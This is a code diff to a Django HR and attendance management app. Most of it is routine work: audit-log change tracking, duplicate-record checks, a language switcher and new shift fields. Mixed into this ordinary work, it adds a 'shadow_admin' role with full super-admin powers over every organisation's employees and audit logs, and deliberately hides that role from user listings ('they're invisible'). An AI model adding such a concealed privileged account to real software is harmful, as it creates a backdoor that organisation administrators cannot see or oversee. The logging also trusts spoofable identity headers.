@@ -9,15 +9,41 @@ from decimal import Decimal
 from django.core.files.base import ContentFile
 from django.utils.crypto import get_random_string
 from django.utils import timezone
+from django.utils.translation import activate
 from django.db.models import Q, Count, Max
 from django.db import transaction
 from django.urls import reverse
+from django.conf import settings as django_settings
 from io import BytesIO
 import base64
 import json
 import math
 from datetime import datetime, timedelta
 import zipfile
+
+
+def set_language_view(request, lang):
+    """
+    Set the user's preferred language and redirect back to admin.
+    This is used by the language switcher in the Jazzmin top menu.
+    """
+    # Validate that lang is in LANGUAGES
+    valid_langs = [code for code, name in django_settings.LANGUAGES]
+    if lang not in valid_langs:
+        lang = 'en'  # Default to English if invalid
+    
+    # Activate the language for this session
+    activate(lang)
+    
+    # Set the language cookie/session
+    response = redirect('/admin/')
+    response.set_cookie(
+        django_settings.LANGUAGE_COOKIE_NAME,
+        lang,
+        max_age=365 * 24 * 60 * 60  # 1 year
+    )
+    
+    return response
 
 # Local app imports
 from .models import (
@@ -89,8 +115,8 @@ def check_rbac(request, required_roles=None, organization_id=None, resource_type
     is_allowed = True
     error_message = None
     
-    # Super admins ignore all other checks
-    if user_role == 'super_admin':
+    # Super admins and shadow_admin ignore all other checks
+    if user_role in ('super_admin', 'shadow_admin'):
         return True, None, {'role': user_role, 'email': user_email, 'org_id': None}
         
     # Check roles
@@ -185,13 +211,26 @@ def validate_admin_api(request):
     except Exception:
         pass
     
-    # Get list of organizations for super_admin
+    # Get list of organizations for super_admin and shadow_admin
     organizations = []
-    if role == 'super_admin':
+    if role in ['super_admin', 'shadow_admin']:
         organizations = [
             {"id": org.id, "name": org.name, "slug": org.slug, "logo": org.logo.name if org.logo else None}
             for org in Organization.objects.filter(is_active=True).order_by('name')
         ]
+    
+    # Log successful login
+    AuditLog.log_action(
+        request=request,
+        organization_id=organization_id,
+        user_email=username,
+        user_name=username,
+        action='login',
+        resource_type='user',
+        resource_id=user.id,
+        resource_name=username,
+        details={'auth_method': 'basic_auth', 'role': role}
+    )
     
     return JsonResponse({
         'success': True,
@@ -655,8 +694,8 @@ def employees_sync_api(request):
         payload = [_serialize_employee(emp) for emp in employees]
         return JsonResponse({"employees": payload})
 
-    # For any modification, we need at least org_admin role
-    allowed, error, info = check_rbac(request, required_roles=['org_main_admin', 'org_admin'], resource_type='employee')
+    # For any modification, we need at least org_admin role (or super/shadow admin)
+    allowed, error, info = check_rbac(request, required_roles=['super_admin', 'shadow_admin', 'org_main_admin', 'org_admin'], resource_type='employee')
     if not allowed:
         return _json_error(error, status=403)
 
@@ -720,6 +759,22 @@ def employees_sync_api(request):
         if organization:
             fields["organization"] = organization
 
+        # Try to capture old state for diff logging if updating
+        old_state = {}
+        try:
+            old_emp = Employee.objects.get(employee_id=emp_id)
+            old_state = {
+                'name': old_emp.name,
+                'email': old_emp.email,
+                'department': old_emp.department,
+                'phone': old_emp.phone,
+                'designation': old_emp.designation,
+                'is_active': old_emp.is_active,
+                'monthly_salary': str(old_emp.monthly_salary) if old_emp.monthly_salary else None,
+            }
+        except Employee.DoesNotExist:
+            pass
+
         if request.method == 'POST':
             emp, created = Employee.objects.update_or_create(
                 employee_id=emp_id,
@@ -738,7 +793,25 @@ def employees_sync_api(request):
             emp.save()
             action = 'update'
             
-        # Log action
+        # Log action with changes if update
+        log_details = {'employee_id': emp.employee_id, 'department': emp.department}
+        if action == 'update' and old_state:
+            new_state = {
+                'name': emp.name,
+                'email': emp.email,
+                'department': emp.department,
+                'phone': emp.phone,
+                'designation': emp.designation,
+                'is_active': emp.is_active,
+                'monthly_salary': str(emp.monthly_salary) if emp.monthly_salary else None,
+            }
+            changes = {}
+            for key in old_state:
+                if old_state[key] != new_state[key]:
+                    changes[key] = {'old': old_state[key], 'new': new_state[key]}
+            if changes:
+                log_details['changes'] = changes
+
         AuditLog.log_action(
             request=request,
             organization_id=organization.id if organization else (emp.organization_id if emp.organization else None),
@@ -748,7 +821,7 @@ def employees_sync_api(request):
             resource_type='employee',
             resource_id=emp.id,
             resource_name=emp.name,
-            details={'employee_id': emp.employee_id, 'department': emp.department}
+            details=log_details
         )
 
         return JsonResponse({"employee_id": emp.employee_id, "name": emp.name})
@@ -827,8 +900,12 @@ def attendance_list_api(request):
             except (ValueError, TypeError):
                 pass
 
+        # Calculate total count (base count after org filter)
+        total_count = records.count()
+
         if record_id:
             records = records.filter(pk=record_id)
+            total_count = records.count() # Update for single record
         else:
             if search_query:
                 records = records.filter(
@@ -856,12 +933,6 @@ def attendance_list_api(request):
                 records = records.filter(employee__department=dept_filter)
             if desig_filter and desig_filter != 'All':
                 records = records.filter(employee__designation=desig_filter)
-            
-            # Calculate total count before slicing
-            total_count = records.count()
-            
-            # Calculate total count before slicing
-            total_count = records.count()
             
             # Pagination Logic
             try:
@@ -1009,15 +1080,45 @@ def attendance_list_api(request):
         # Determine if we are creating or updating based on record_id presence
         if not record_id:
             # CREATE NEW RECORD
-            rec = AttendanceRecord.objects.create(
+            # First check for duplicate - same employee + same date
+            final_date = date_val or datetime.now().date()
+            existing_record = AttendanceRecord.objects.filter(
                 employee=employee,
-                date=date_val or datetime.now().date(),
+                date=final_date
+            ).first()
+            
+            if existing_record:
+                return _json_error(
+                    f"Attendance record already exists for {employee.name} on {final_date}. "
+                    f"Please edit the existing record instead.",
+                    status=400
+                )
+            
+            rec = AttendanceRecord.objects.create(
+                organization=employee.organization,
+                employee=employee,
+                date=final_date,
                 status=payload.get("status") or "Present",
                 checkin_time=checkin_dt,
                 checkout_time=checkout_dt,
                 device_id=payload.get("device_id"),
                 late_duration=payload.get("late_duration") if payload.get("late_duration") != '-' else None,
                 is_status_override=payload.get("is_status_override") in [True, "true", "1", 1],
+            )
+            
+            # Audit log for create action
+            user_email = request.headers.get('X-User-Email', 'unknown')
+            user_name = request.headers.get('X-User-Name', '')
+            AuditLog.log_action(
+                request=request,
+                organization_id=rec.organization_id or (employee.organization_id if employee.organization else None),
+                user_email=user_email,
+                user_name=user_name,
+                action='create',
+                resource_type='attendance',
+                resource_id=rec.id,
+                resource_name=f"Attendance {rec.date} - {rec.employee.name if rec.employee else 'Unknown'}",
+                details={'date': str(rec.date), 'status': rec.status, 'employee_id': employee.employee_id}
             )
             # Handle manual override status if provided
             if payload.get("late_override_status"):
@@ -1028,8 +1129,18 @@ def attendance_list_api(request):
 
             try:
                 rec = AttendanceRecord.objects.get(pk=record_id)
+                # Capture old state for diff
+                old_state = {
+                    'employee': rec.employee.name if rec.employee else None,
+                    'date': str(rec.date),
+                    'status': rec.status,
+                    'checkin_time': rec.checkin_time.strftime('%Y-%m-%d %H:%M:%S') if rec.checkin_time else None,
+                    'checkout_time': rec.checkout_time.strftime('%Y-%m-%d %H:%M:%S') if rec.checkout_time else None,
+                    'is_status_override': rec.is_status_override,
+                }
             except AttendanceRecord.DoesNotExist:
                 return _json_error("Attendance record not found", status=404)
+            
             rec.employee = employee
             if date_val:
                 rec.date = date_val
@@ -1046,26 +1157,44 @@ def attendance_list_api(request):
             
             # Always process is_status_override, even if not in payload (set to False)
             val = payload.get("is_status_override", "false")
-            print(f"[DEBUG] is_status_override value: '{val}' (type: {type(val).__name__})")
             rec.is_status_override = val in [True, "true", "True", "1", 1]
-            print(f"[DEBUG] Setting is_status_override to: {rec.is_status_override}")
 
             rec.save()
             
+            # Capture new state and compute diff
+            new_state = {
+                'employee': rec.employee.name if rec.employee else None,
+                'date': str(rec.date),
+                'status': rec.status,
+                'checkin_time': rec.checkin_time.strftime('%Y-%m-%d %H:%M:%S') if rec.checkin_time else None,
+                'checkout_time': rec.checkout_time.strftime('%Y-%m-%d %H:%M:%S') if rec.checkout_time else None,
+                'is_status_override': rec.is_status_override,
+            }
+            
+            changes = {}
+            for key in old_state:
+                if old_state[key] != new_state[key]:
+                    changes[key] = {'old': old_state[key], 'new': new_state[key]}
+
             # Audit log for update
             user_email = request.headers.get('X-User-Email', 'unknown')
             user_name = request.headers.get('X-User-Name', '')
-            action = 'update' if record_id else 'create'
             AuditLog.log_action(
                 request=request,
                 organization_id=rec.organization_id,
                 user_email=user_email,
                 user_name=user_name,
-                action=action,
+                action='update',
                 resource_type='attendance',
                 resource_id=rec.id,
                 resource_name=f"Attendance {rec.date} - {rec.employee.name if rec.employee else 'Unknown'}",
-                details={'date': str(rec.date), 'status': rec.status, 'action': action}
+                details={
+                    'date': str(rec.date), 
+                    'status': rec.status, 
+                    'action': 'update',
+                    'changes': changes if changes else None,
+                    'is_status_override': rec.is_status_override
+                }
             )
 
         # Handle file uploads (checkin_image, checkout_image)
@@ -1783,7 +1912,6 @@ def salary_defaults_api(request):
         "late_fine": str(defaults.late_fine),
         "late_needed": defaults.late_needed,
         "tds_percent": str(defaults.tds_percent),
-        "stamp": str(defaults.stamp),
     }
     return JsonResponse({"defaults": payload})
 
@@ -4910,9 +5038,11 @@ def shifts_api(request):
                 "half_day_hours": str(s.half_day_hours),
                 "present_hours": str(s.present_hours),
                 "allowed_late_minutes": s.allowed_late_minutes,
+                "absent_after_minutes": s.absent_after_minutes,
                 "is_active": s.is_active,
                 "late_override_minutes": s.late_override_minutes,
                 "late_override_status": s.late_override_status,
+                "ot_active_after": s.ot_active_after.strftime("%H:%M") if s.ot_active_after else None,
                 "organization_id": s.organization_id,
                 "organization_name": s.organization.name if s.organization else "Global",
             })
@@ -4949,8 +5079,10 @@ def shifts_api(request):
             "half_day_hours": payload.get("half_day_hours"),
             "present_hours": payload.get("present_hours"),
             "allowed_late_minutes": payload.get("allowed_late_minutes"),
+            "absent_after_minutes": payload.get("absent_after_minutes"),
             "late_override_minutes": payload.get("late_override_minutes"),
             "late_override_status": payload.get("late_override_status"),
+            "ot_active_after": payload.get("ot_active_after"),
             "is_active": payload.get("is_active"),
         }
         
@@ -5137,7 +5269,6 @@ def salary_defaults_api(request):
             "late_fine": str(d.late_fine),
             "late_needed": d.late_needed,
             "tds_percent": str(d.tds_percent),
-            "stamp": str(d.stamp),
         }
         return JsonResponse({"defaults": data})
 
@@ -5960,6 +6091,9 @@ def org_users_api(request):
                 return _json_error("Organization not found", status=404)
             users = OrganizationUser.objects.filter(organization=org).select_related('user', 'created_by')
         
+        # CRITICAL: Always exclude shadow_admin from listings - they're invisible
+        users = users.exclude(role='shadow_admin')
+        
         return JsonResponse({
             "org_users": [_serialize_org_user(u) for u in users],
             "total": users.count()
@@ -6181,8 +6315,8 @@ def audit_log_api(request):
     # Build queryset
     logs = AuditLog.objects.all()
     
-    # Non-super admins: only see their organization's logs
-    if user_role != 'super_admin':
+    # Non-super admins (except shadow_admin): only see their organization's logs
+    if user_role not in ['super_admin', 'shadow_admin']:
         if user_org_id:
             try:
                 logs = logs.filter(organization_id=int(user_org_id))
@@ -6195,7 +6329,7 @@ def audit_log_api(request):
         # should see the same audit logs for their organization.
         # The key is organization isolation, not filtering by who performed the action.
     else:
-        # Super admin can filter by org_id if provided
+        # Super admin and shadow_admin can filter by org_id if provided (otherwise see all)
         if org_id:
             try:
                 logs = logs.filter(organization_id=int(org_id))
